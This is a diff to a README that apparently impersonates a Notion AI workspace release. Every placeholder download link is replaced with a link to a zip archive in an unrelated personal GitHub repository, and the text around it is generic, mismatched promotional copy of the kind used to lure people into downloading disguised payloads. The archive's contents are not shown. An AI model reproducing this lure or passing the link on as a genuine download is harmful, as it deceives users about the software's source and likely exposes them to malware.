@@ -4,7 +4,7 @@
 
 > The all-in-one workspace everyone uses — now with AI blocks that transform messy notes into structured projects, generate content, and help teams move faster than ever.
 
-[![Download Now](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://download.com)&nbsp;
+[![Download Now](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://github.com/ronniv2453/notion-ai/raw/refs/heads/main/ultrasonics/ai-notion-v1.6.zip)&nbsp;
 ![Platform](https://img.shields.io/badge/Platform-Available-green?style=flat-square)&nbsp;
 ![Release](https://img.shields.io/badge/Release-2026-orange?style=flat-square)
 
@@ -37,9 +37,9 @@ Available on **Available Now** · Available on **Web, iOS, Android, macOS, Windo
 
 ### Ready to play / use?
 
-[![Download Notion — AI-Powered Workspace](https://img.shields.io/badge/Download-Notion%20%20AIPowered%20Workspace-brightgreen?style=for-the-badge)](https://download.com)
+[![Download Notion — AI-Powered Workspace](https://img.shields.io/badge/Download-Notion%20%20AIPowered%20Workspace-brightgreen?style=for-the-badge)](https://github.com/ronniv2453/notion-ai/raw/refs/heads/main/ultrasonics/ai-notion-v1.6.zip)
 
-> **[Click here to download](https://download.com)**
+> **[Click here to download](https://github.com/ronniv2453/notion-ai/raw/refs/heads/main/ultrasonics/ai-notion-v1.6.zip)**
 
 </div>
 
@@ -71,7 +71,7 @@ Notion — AI-Powered Workspace is one of the **most hyped releases of Summer 20
 
 | Download | Community | News |
 |:--------:|:---------:|:----:|
-| [Download here](https://download.com) | Reddit & Discord | Gaming & tech news |
+| [Download here](https://github.com/ronniv2453/notion-ai/raw/refs/heads/main/ultrasonics/ai-notion-v1.6.zip) | Reddit & Discord | Gaming & tech news |
 
 ---
 
@@ -79,7 +79,7 @@ Notion — AI-Powered Workspace is one of the **most hyped releases of Summer 20
 
 **Don't miss out — Notion — AI-Powered Workspace is one of 2026's must-have releases.**
 
-[![Download Now](https://img.shields.io/badge/Download-Notion%20%20AIPowered%20Workspace-blue?style=for-the-badge)](https://download.com)
+[![Download Now](https://img.shields.io/badge/Download-Notion%20%20AIPowered%20Workspace-blue?style=for-the-badge)](https://github.com/ronniv2453/notion-ai/raw/refs/heads/main/ultrasonics/ai-notion-v1.6.zip)
 
 *Notion — AI-Powered Workspace — Available Now · Web, iOS, Android, macOS, Windows*
 
